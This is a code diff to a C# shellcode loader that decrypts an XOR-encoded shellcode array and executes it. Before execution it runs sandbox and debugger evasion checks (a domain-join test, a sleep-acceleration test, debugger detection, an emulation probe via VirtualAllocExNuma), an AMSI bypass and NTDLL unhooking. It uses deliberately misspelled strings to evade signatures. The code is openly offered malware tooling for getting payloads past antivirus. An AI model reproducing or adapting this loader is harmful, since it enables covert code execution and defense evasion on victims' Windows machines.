@@ -395,7 +395,7 @@ namespace CsharpShellCodeLoader
 
         public static uint InvokeSuperMain()
         {       
-            //Add your encrypted shellcode
+            //Add your shellcode in C# format encrypted using XOR cipher
             byte[] Super = new byte[66559] {
             0xac, 0xb2, 0x73, 0x1c, 0xb2, 0x79, 0x1e, 0x0a, 0xb2, 0x79, 0x16, 0xda, 0x12, 0xf5, 0xfa,
             <...SNIP...>
@@ -405,10 +405,11 @@ namespace CsharpShellCodeLoader
             //Decrypt the shellcode
             for (int i = 0; i < Super.Length; i++)
             {
+	    //Edit with your XOR key
              Super[i] = (byte)((uint)Super[i] ^ 0xfa);
             }
  
-            Console.WriteLine("Step 2: Execute She11cOde");
+	    Console.WriteLine("[+] She11cOde successfully loaded (with NTD11 unh00king)");
             uint ntstats = InvokeSuperCode(Super);
             return ntstats;
         }
@@ -455,15 +456,12 @@ namespace CsharpShellCodeLoader
 
         static void Main(string[] args)
         {
-            Console.WriteLine("Csharp ShellC0de L0ader");
-            Console.WriteLine("Step 1 - Defense Evas10n");
-            Console.WriteLine("**** Sandb0x Checks");
+            Console.WriteLine("** C# ShellC0de L0ader **");
             // Defense evasion: Exit the program if it is running on a computer that is not joined to a domain
             if (string.Equals("WORKGROUP", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
             {
                 return;
             }
-
             // Defense evasion: Exit the program if after sleeping for 15s, time did not really passed
             DateTime t1 = DateTime.Now;
             Sleep(15000);
@@ -472,25 +470,24 @@ namespace CsharpShellCodeLoader
             {
                 return;
             }
-
             // Defense evasion:  Exit the program if a debugger is attached
             if (System.Diagnostics.Debugger.IsAttached)
             {
                 return;
             }
-
             // Defense evasion: Exit the program if making an uncommon API call fails (meaning the AV engine can't emulating it)
             IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
             if (mem == null)
             {
                 return;
             }
+            Console.WriteLine("[+] Sucessfully passed sandb0x checks");
 
             // Defense evasion: Try to bypass 'A-'M-'S-'I-'
-            Console.WriteLine("**** 'A-M-S-I' Bypass");
             SuperByposs();
+	    Console.WriteLine("[+] Successfully bypassed A-M-S-I");
 
-            Console.WriteLine("**** NTD11 Unhook1ng");
+	   // Load the She11cOde
             uint ntstatus = InvokeSuperMain();
             if (ntstatus != 0)
             {
